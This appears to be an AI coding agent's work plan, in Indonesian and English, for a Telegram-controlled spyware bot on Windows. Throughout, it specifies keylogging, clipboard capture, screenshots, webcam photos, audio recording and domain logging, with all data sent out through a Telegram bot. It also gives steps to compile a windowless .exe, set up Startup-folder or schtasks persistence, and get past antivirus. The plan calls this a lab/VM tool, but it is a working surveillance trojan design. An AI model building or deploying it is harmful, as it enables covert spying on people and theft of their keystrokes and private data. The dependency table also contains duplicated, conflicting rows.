# spyware-telegram-remote - Work Plan

## TL;DR (For humans)

**What you'll get:** Sebuah script Python (`file_spyware.py`) yang jalan di Windows VM sebagai Telegram bot. Kamu bisa remote-control VM dari Telegram — ambil screenshot, foto webcam, rekam audio, baca keylog, clipboard, daftar file, dan koneksi domain — dengan mengirim perintah di chat. Script di-compile menjadi `.exe` tunggal.

**Why this approach:** Polling Telegram (bukan webhook) — tidak perlu IP publik, paling simpel untuk lab/VM lokal. Semua 7 modul SpyWare dijalankan di background thread, bisa start/stop on-demand via command.

**What it will NOT do:** Tidak pakai webhook, tidak enkripsi/obfuskasi .exe, tidak multi-user (hanya CHAT_ID kamu yang bisa kontrol).

**Effort:** Medium
**Risk:** Low - semua modul sudah ada di library, tinggal wiring ke Telegram
**Decisions to sanity-check:** Token disimpan di `.env` file di direktori yang sama dengan `.exe` di VM.

Your next move: Jalankan `$start-work`. Full execution detail follows below.

---

> TL;DR (machine): Medium effort, Low risk. Deliverables: `file_spyware.py` (full bot controller, 7 spy modules), `.env` template, `requirements.txt`, PyInstaller command, deployment guide.

## Scope
### Must have
- Rewrite `file_spyware.py` sebagai Telegram bot controller
- 7 on-demand command handlers: `/screenshot`, `/keylog`, `/clipboard`, `/webcam`, `/audio`, `/files`, `/domains`
- Background runner commands: `/startall`, `/stopall`
- Utility commands: `/start`, `/status`, `/help`
- `.env` file untuk token + chat_id (bukan hardcode)
- `requirements.txt` berisi semua dependency
- PyInstaller compile command (onefile, windowed)
- Deployment guide di README / comment
- **Graceful shutdown**: Ctrl+C atau kill process → stop semua module threads dengan timeout, cleanup temporary state (jangan force kill)

### Must NOT have (guardrails, anti-slop, scope boundaries)
- Webhook mode
- Modifikasi source SpyWare library
- Enkripsi / obfuskasi .exe
- Multi-user / allowlist logic
- Web dashboard
- Scheduling otomatis (cron-like dalam bot)

## Verification strategy
> Zero human intervention - all verification is agent-executed.
- Test decision: tests-after (manual QA on VM) — library SpyWare tidak punya test suite, integration test via actual bot command
- Evidence: `.omo/evidence/` — screenshot bot chat, file output dari tiap module

## Execution strategy
### Parallel execution waves

**Wave 1** (parallel): Setup foundation
- Todo 1: Setup `.env` + `requirements.txt`
- Todo 2: Rewrite `file_spyware.py` — imports, env loader, bot init, `/start` + `/help` + `/status`

**Wave 2** (setelah Wave 1, parallel): Implementasi command handlers
- Todo 3: Handler `/screenshot` + `/webcam` (send photo)
- Todo 4: Handler `/keylog` + `/clipboard` (send text)
- Todo 5: Handler `/audio` (send .wav document)
- Todo 6: Handler `/files` + `/domains` (send .csv / .txt document)

**Wave 3** (setelah Wave 2): Background runner + uninstall
- Todo 7: `/startall`, `/stopall`, thread management
- Todo 8: `/uninstall` + graceful shutdown — hapus autostart, stop semua modul, bersihkan file output, exit process

**Wave 4** (setelah Wave 3): Compile + deployment
- Todo 9: PyInstaller compile — `pyinstaller --onefile --windowed file_spyware.py`
- Todo 10: Deployment guide — copy ke VM, autostart setup, cara cabut/uninstall

### Dependency matrix
| Todo | Depends on | Blocks | Can parallelize with |
| --- | --- | --- | --- |
| 1 | — | 2,3,4,5,6,7,8 | 2 (partially) |
| 2 | 1 | 3,4,5,6,7,8 | 3,4,5,6 setelah selesai |
| 3 | 1,2 | 9 | 4,5,6 |
| 4 | 1,2 | 9 | 3,5,6 |
| 5 | 1,2 | 9 | 3,4,6 |
| 6 | 1,2 | 9 | 3,4,5 |
| 7 | 2,3,4,5,6 | 8,9 | — |
| 8 | 7 | 9 | — |
| 9 | 1..8 | — | 10 |
| 10 | — | — | 9 |
| 7 | 2,3,4,5,6 | 8 | — |
| 8 | 1..7 | — | 9 |
| 9 | — | — | 8 |

## Todos
> Implementation + Test = ONE todo. Never separate.
<!-- APPEND TASK BATCHES BELOW THIS LINE WITH edit/apply_patch - never rewrite the headers above. -->

- [x] 1. Setup `.env` template + `requirements.txt`
  What to do: Buat file `.env.example` berisi `BOT_TOKEN=` dan `CHAT_ID=`, buat `requirements.txt` berisi semua dependency. JANGAN hardcode token di `.py`.
  Must NOT do: Jangan commit `.env` yang sudah diisi token sungguhan.
  Parallelization: Wave 1 | Blocked by: — | Blocks: semua todo lain
  References:
    - `comunicate.py:1-4` — pola TOKEN + CHAT_ID sebelumnya
    - SpyWare deps: `pyautogui`, `opencv-python`, `pillow`, `pyperclip`, `pynput`, `pyaudio`
    - Bot dep: `pyTelegramBotAPI`, `python-dotenv`, `requests`
  Acceptance criteria:
    - `cat .env.example` menampilkan dua baris: `BOT_TOKEN=` dan `CHAT_ID=`
    - `cat requirements.txt` berisi minimal 9 package
    - `pip install -r requirements.txt` exit code 0
  QA scenarios:
    - Happy: `pip install -r requirements.txt` selesai tanpa error. Evidence: terminal output.
    - Failure: Package tidak ditemukan → cek nama package di PyPI, fix nama.
  Commit: Y | chore(deps): add requirements.txt and .env.example

- [x] 2. Rewrite `file_spyware.py` — bot init, imports, env loader, `/start` + `/help` + `/status`
  What to do: Rewrite `file_spyware.py` dari awal. Load `BOT_TOKEN` dan `CHAT_ID` dari `.env` (pakai `python-dotenv`). Inisialisasi `telebot.TeleBot`. Buat handler `/start`, `/help`, `/status`. `/status` tampilkan modul mana yang sedang berjalan.
  Must NOT do: Jangan import SpyWare modules di top-level (import di dalam handler untuk avoid crash jika module tidak terinstall). Jangan hardcode token.
  Parallelization: Wave 1 | Blocked by: 1 | Blocks: 3,4,5,6,7
  References:
    - `file_spyware.py:1-31` — kode lama (ganti semuanya)
    - `comunicate.py:1-22` — pola Telegram request
    - SpyWare `__init__.py` exports: `AudioLogger`, `ClipboardLogger`, `DomainsLogger`, `FilesLogger`, `KeyLogger`, `ScreenLogger`, `WebcamLogger`
    - `SpyWare/SpyWare.py:117-150` — pola `spy()` dengan threading
    - pyTelegramBotAPI: `bot = telebot.TeleBot(TOKEN)`, `@bot.message_handler(commands=[...])`, `bot.infinity_polling()`
  Acceptance criteria:
    - `python file_spyware.py` start tanpa error (pastikan `.env` sudah diisi)
    - Di Telegram: `/start` → reply help message
    - `/status` → reply "No modules running" (di awal)
    - `/help` → list semua command
  QA scenarios:
    - Happy: Bot reply ke `/start` dalam <10s. Evidence: screenshot Telegram chat.
    - Failure: `KeyError: BOT_TOKEN` → pastikan `.env` ada dan `load_dotenv()` dipanggil.
  Commit: Y | feat(bot): init telegram bot with env config and utility commands

- [x] 3. Implementasi handler `/screenshot` + `/webcam` — kirim foto ke Telegram
  What to do: Tambahkan command handler `/screenshot` dan `/webcam`. Masing-masing: load config modul, jalankan Daemon sekali (bukan loop), tunggu file output tersedia, kirim via `bot.send_photo()`.
  Must NOT do: Jangan panggil `run_for_ever()` — itu loop tak terbatas. Gunakan `run()` atau ambil satu frame. Jangan block main thread.
  Parallelization: Wave 2 | Blocked by: 1,2 | Blocks: 8
  References:
    - `SpyWare/ScreenLogger/__init__.py`: exports `Daemon`, `screenConfig` (alias `config_load`)
    - `SpyWare/WebcamLogger/__init__.py`: exports `Daemon`, `webcamConfig`
    - Default output screen: `screenshots/screenshot*.png` (dari `setup.conf`)
    - Default output webcam: `pictures/webcam*.png`
    - `SpyWare/SpyWare.py:117-140` — cara instantiate Daemon + config_load pattern
    - pyTelegramBotAPI: `bot.send_photo(chat_id, open(filepath, 'rb'))`
    - Pattern threading: `Thread(target=daemon.run_for_ever, daemon=True)`
  Acceptance criteria:
    - `/screenshot` → bot kirim file `.png` ke Telegram dalam <15s
    - `/webcam` → bot kirim file `.png` (foto webcam) ke Telegram dalam <15s
    - Jika file tidak ada → bot reply "Error: no output file found"
  QA scenarios:
    - Happy: Screenshot tersedia di `screenshots/`, bot kirim foto. Evidence: screenshot Telegram.
    - Failure: Webcam tidak ada → `cv2.VideoCapture` return False → bot reply error message.
  Commit: Y | feat(bot): add /screenshot and /webcam command handlers

- [x] 4. Implementasi handler `/keylog` + `/clipboard` — kirim teks ke Telegram
  What to do: Tambahkan handler `/keylog` dan `/clipboard`. Baca file output yang ada (`keySpy.txt`, `clipboard.txt`), kirim via `bot.send_message()`. Jika file kosong / belum ada → reply "No data yet, start module first with /startall".
  Must NOT do: Jangan start keylogger baru di handler ini — hanya baca file output. Keylogger harus sudah berjalan via `/startall`. Jangan kirim lebih dari 4000 karakter per pesan (Telegram limit).
  Parallelization: Wave 2 | Blocked by: 1,2 | Blocks: 8
  References:
    - `SpyWare/KeyLogger/__init__.py`: exports `Daemon`, `keyConfig`; default output: `keySpy.txt`
    - `SpyWare/ClipboardLogger/__init__.py`: exports `Daemon`, `clipboardConfig`; default output: `clipboard.txt`
    - Default config keylogger: `[SAVE] filename = keySpy.txt`
    - Telegram message limit: 4096 chars → potong dengan `[-4000:]`
    - pyTelegramBotAPI: `bot.send_message(chat_id, text)`
  Acceptance criteria:
    - `/keylog` → bot kirim isi `keySpy.txt` (atau "No data" jika kosong)
    - `/clipboard` → bot kirim isi `clipboard.txt` (atau "No data" jika kosong)
    - Teks tidak melebihi 4096 karakter per pesan
  QA scenarios:
    - Happy: `keySpy.txt` ada isi → bot kirim teks. Evidence: screenshot Telegram.
    - Failure: File tidak ada → bot reply "No data yet" (bukan crash).
  Commit: Y | feat(bot): add /keylog and /clipboard command handlers

- [x] 5. Implementasi handler `/audio` — kirim rekaman `.wav` ke Telegram
  What to do: Handler `/audio` trigger AudioLogger sekali dengan durasi pendek (10s default), tunggu file `.wav` selesai, kirim via `bot.send_document()`.
  Must NOT do: Jangan block bot polling thread saat merekam. Jalankan rekaman di thread terpisah, polling tunggu file muncul.
  Parallelization: Wave 2 | Blocked by: 1,2 | Blocks: 8
  References:
    - `SpyWare/AudioLogger/__init__.py`: exports `Daemon`, `audioConfig`
    - Default config: `[TIME] interval = 3590, record_time = 10` → rekam 10s
    - Default output: `records/record*.wav`
    - `SpyWare/SpyWare.py:117-140` — threading pattern untuk module
    - pyTelegramBotAPI: `bot.send_document(chat_id, open(filepath, 'rb'))`
    - pyaudio dibutuhkan — pastikan di `requirements.txt`
  Acceptance criteria:
    - `/audio` → bot kirim file `.wav` ke Telegram dalam <30s
    - Jika tidak ada microphone → bot reply error message (tidak crash)
  QA scenarios:
    - Happy: Mic tersedia → `records/*.wav` muncul → bot kirim document. Evidence: screenshot Telegram.
    - Failure: `IOError: No Default Input Device Available` → catch exception → bot reply "No microphone".
  Commit: Y | feat(bot): add /audio command handler

- [x] 6. Implementasi handler `/files` + `/domains` — kirim CSV/TXT ke Telegram
  What to do: Handler `/files` kirim `files.csv` (filesystem metadata). Handler `/domains` kirim `domains.txt` (connection log). Kedua file dihasilkan oleh background module via `/startall`. Handler hanya baca + kirim.
  Must NOT do: Jangan start FilesLogger/DomainsLogger di handler ini — heavy scan. Hanya baca file yang sudah ada.
  Parallelization: Wave 2 | Blocked by: 1,2 | Blocks: 8
  References:
    - `SpyWare/FilesLogger/__init__.py`: exports `Daemon`, `filesConfig`; default output: `files.csv`
    - `SpyWare/DomainsLogger/__init__.py`: exports `Daemon`, `domainsConfig`; DomainsLogger punya dua thread: `run_CacheDns()` + `run_AppData()`; default output: `domains.txt`
    - `SpyWare/SpyWare.py:126-136` — DomainsLogger pakai 2 thread (beda dari modul lain)
    - pyTelegramBotAPI: `bot.send_document()` untuk file besar
    - Jika file >50MB → Telegram tolak → potong atau zip dulu
  Acceptance criteria:
    - `/files` → bot kirim `files.csv` atau "No data yet"
    - `/domains` → bot kirim `domains.txt` atau "No data yet"
    - Handle file >50MB dengan reply peringatan
  QA scenarios:
    - Happy: `files.csv` ada → bot kirim document. Evidence: screenshot Telegram.
    - Failure: File tidak ada → bot reply "Run /startall first to collect data".
  Commit: Y | feat(bot): add /files and /domains command handlers

- [x] 7. Implementasi `/startall`, `/stopall`, thread management
  What to do: `/startall` jalankan semua 7 modul di background daemon threads (mirror `spy()` di SpyWare.py). `/stopall` set `daemon.run = False` untuk stop gracefully. Simpan state modul running di dict global `running_modules`.
  Must NOT do: Jangan allow double-start (cek `running_modules` dulu). Jangan kill threads paksa — gunakan `daemon.run = False`.
  Parallelization: Wave 3 | Blocked by: 2,3,4,5,6 | Blocks: 8
  References:
    - `SpyWare/SpyWare.py:117-155` — full `spy()` implementation, threading pattern per module
    - `SpyWare/SpyWare.py:112-115` — `stop_deamons()` sets `daemon.run = False`
    - DomainsLogger: perlu 2 thread (`run_CacheDns` + `run_AppData`) — lihat `spy()` baris 126-136
    - Import pattern: `from SpyWare.AudioLogger import Daemon as AudioDaemon, config_load as audioConfig`
    - Global state: `running_modules: dict = {}` — key=module_name, value=(daemon, [threads])
  Acceptance criteria:
    - `/startall` → reply "All modules started" + semua 7 modul berjalan
    - `/status` → reply list modul yang running
    - `/stopall` → reply "All modules stopped" + `running_modules` empty
    - Double `/startall` → reply "Already running"
  QA scenarios:
    - Happy: `/startall` → `/status` → tampilkan 7 modul. Evidence: screenshot Telegram.
    - Failure: Module gagal import (misal pyaudio tidak ada) → catch ImportError, skip module, notify di status.
  Commit: Y | feat(bot): add /startall and /stopall with thread management

- [x] 8. Implementasi `/uninstall` + graceful shutdown (Ctrl+C handler)
  What to do:
  (A) **Graceful shutdown via Ctrl+C / SIGTERM** — Tangkap `KeyboardInterrupt` di main loop dan `signal.signal(SIGTERM, ...)` di Windows. Saat signal diterima: (1) set `daemon.run = False` untuk semua running module, (2) join semua threads dengan `timeout=5`, (3) stop bot polling dengan `bot.stop_polling()`, (4) exit bersih.
  (B) **`/uninstall` Telegram command** — Hapus autostart entry (Startup folder link), stop semua spy module, opsional hapus file output (spy_output/), kirim konfirmasi ke Telegram, lalu `os._exit(0)`. Ini untuk development — bisa cabut tanpa akses fisik ke VM.
  Must NOT do: Jangan `os.kill(os.getpid(), 9)` (force kill tanpa cleanup). Jangan hapus `.exe` itu sendiri via Python di Windows (file lock). Jangan hapus `.env` saat uninstall (user mungkin mau re-deploy).
  Parallelization: Wave 3 | Blocked by: 7 | Blocks: 9
  References:
    - `SpyWare/SpyWare.py:112-115` — `stop_deamons()`: `daemon.run = False`
    - `SpyWare/SpyWare.py:117-150` — `spy()` try/except KeyboardInterrupt → `stop_deamons()` → `join_all()`
    - `SpyWare/SpyWare.py:167-195` — `enabled()` / Windows Startup folder path:
      `C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\<exe>.lnk`
    - `SpyWare/SpyWare.py:198-220` — `remove_trace()`: hapus file output per module
    - Python stdlib: `signal.signal()`, `threading.Thread.join(timeout=5)`, `atexit.register()`
    - pyTelegramBotAPI: `bot.stop_polling()`
    - Windows link removal: `os.remove(link_path)` di Startup folder
  Acceptance criteria:
    - Ctrl+C di terminal → semua threads stop dalam <10s, bot stop polling, process exit 0
    - `/uninstall` → autostart link di Startup folder terhapus, semua modul stop, bot kirim "Uninstalled. Bot shutting down.", process exit
    - Re-run `.exe` setelah `/uninstall` → bisa start normal kembali (tidak ada state corrupt)
  QA scenarios:
    - Happy: Ctrl+C → process exit bersih tanpa hanging thread. Evidence: terminal exit code 0.
    - Happy: `/uninstall` → cek Startup folder → link tidak ada. Evidence: screenshot folder Startup.
    - Failure: Thread tidak berhenti dalam 5s → log warning "Force stopping <module>", lanjut exit.
  Commit: Y | feat(bot): add /uninstall command and graceful shutdown handler

- [x] 9. Compile ke .exe dengan PyInstaller
  What to do: Install PyInstaller, jalankan compile command untuk `file_spyware.py` → single `.exe`. `.env` file harus ikut-serta (disalin manual ke VM, bukan bundled ke .exe).
  Must NOT do: Jangan bundle `.env` ke dalam .exe. Jangan pakai `--uac-admin` kecuali perlu.
  Parallelization: Wave 4 | Blocked by: 1..8 | Blocks: —
  References:
    - `SpyWare_onefile.spec` — referensi: `console=False`, `upx=True`, hidden imports pattern
    - PyInstaller docs: `--onefile --windowed --hidden-import`
    - Hidden imports yang mungkin perlu: `SpyWare`, `SpyWare.AudioLogger`, `SpyWare.KeyLogger`, `SpyWare.ScreenLogger`, `SpyWare.WebcamLogger`, `SpyWare.ClipboardLogger`, `SpyWare.DomainsLogger`, `SpyWare.FilesLogger`, `pyautogui`, `telebot`, `dotenv`
    - Command: `pyinstaller --onefile --windowed --hidden-import=SpyWare --hidden-import=telebot file_spyware.py`
  Acceptance criteria:
    - `dist/file_spyware.exe` exists setelah compile
    - `.exe` berjalan di Windows tanpa console window
    - Copy `.env` ke folder yang sama → `.exe` bisa connect ke Telegram
  QA scenarios:
    - Happy: `dist/file_spyware.exe` jalan, bot online. Evidence: screenshot bot reply `/start`.
    - Failure: `ModuleNotFoundError` saat runtime → tambahkan `--hidden-import=<module>` ke compile command.
  Commit: Y | build: add pyinstaller compile command for file_spyware.exe

- [x] 10. Deployment guide — copy ke VM, autostart setup, cara uninstall
  What to do: Dokumentasikan cara deploy `.exe` ke Windows VM dan setup autostart. Sertakan cara uninstall (via `/uninstall` command atau manual). Tulis sebagai comment di `file_spyware.py` header atau buat `DEPLOY.md`.
  Must NOT do: Jangan automated deployment script yang push ke remote — guide manual saja.
  Parallelization: Wave 4 | Blocked by: — | Blocks: —
  References:
    - `SpyWare/SpyWare.py:167-195` — `enabled()` function: Windows Startup folder path = `C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Startup\`
    - Task Scheduler alternative: `schtasks /create /tn "SpyWare" /tr "C:\path\file_spyware.exe" /sc onlogon /ru <user>`
    - Todo 8 — `/uninstall` command
  Acceptance criteria:
    - Guide mencakup: (1) copy .exe + .env ke VM, (2) buka .exe, (3) autostart via Startup folder, (4) cara cabut: `/uninstall` via Telegram atau hapus link di Startup folder
    - Minimal 4 langkah jelas, bisa diikuti tanpa penjelasan tambahan
  QA scenarios:
    - Happy: Ikuti guide → bot online setelah VM reboot. Evidence: screenshot bot reply setelah reboot.
    - Failure: .exe di-block antivirus → guide mention: disable AV temporarily atau add exclusion.
    - Happy (uninstall): `/uninstall` → VM tidak start bot lagi setelah reboot. Evidence: Startup folder screenshot.
  Commit: Y | docs: add deployment and uninstall guide

## Final verification wave
> Runs in parallel after ALL todos. ALL must APPROVE. Surface results and wait for the user's explicit okay before declaring complete.
- [x] F1. Plan compliance audit — semua 10 todo ada acceptance criteria agent-executable
- [x] F2. Code quality review — tidak ada hardcode token, tidak ada bare except, semua thread daemon=True, graceful shutdown ada
- [x] F3. Real manual QA — test tiap command di Telegram chat, verifikasi file diterima, test `/uninstall` + Ctrl+C
- [x] F4. Scope fidelity — 7 module handlers ada semua, uninstall+graceful shutdown ada, tidak ada fitur di luar scope

## Commit strategy
- Setiap todo = 1 commit (lihat "Commit:" di tiap todo)
- Urutan: chore → feat (utility commands) → feat (per handler) → feat (startall/stopall/uninstall) → build → docs
- Tidak push ke remote kecuali diminta

## Success criteria
- `file_spyware.py` jalan di Windows VM
- Semua 7 command Telegram handler berfungsi
- `/startall` + `/stopall` + `/uninstall` kontrol semua modul
- Ctrl+C graceful shutdown tanpa hanging thread
- `dist/file_spyware.exe` berhasil di-compile
- Bot aktif setelah VM reboot (via autostart)
- Bot dapat di-uninstall via `/uninstall` atau hapus Startup folder link
